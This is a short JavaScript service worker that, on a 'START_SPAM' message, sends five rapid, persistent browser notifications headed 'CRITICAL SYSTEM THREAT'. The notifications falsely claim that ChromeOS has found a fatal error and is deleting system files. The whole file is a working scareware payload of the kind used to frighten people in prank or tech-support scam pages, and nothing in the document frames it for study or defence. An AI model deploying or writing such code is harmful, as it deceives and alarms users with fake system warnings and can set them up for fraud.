self.addEventListener('message', (event) => {
  if (event.data && event.data.type === 'START_SPAM') {
    let count = 0;
    const spammer = setInterval(() => {
      self.registration.showNotification("CRITICAL SYSTEM THREAT #" + (count + 1), {
        body: "ChromeOS has detected a fatal error. Deleting system files...",
        icon: "https://cdn-icons-png.flaticon.com",
        tag: "spam-" + count + "-" + Date.now(),
        requireInteraction: true 
      });
      count++;
      if (count >= 5) clearInterval(spammer);
    }, 200); 
  }
});
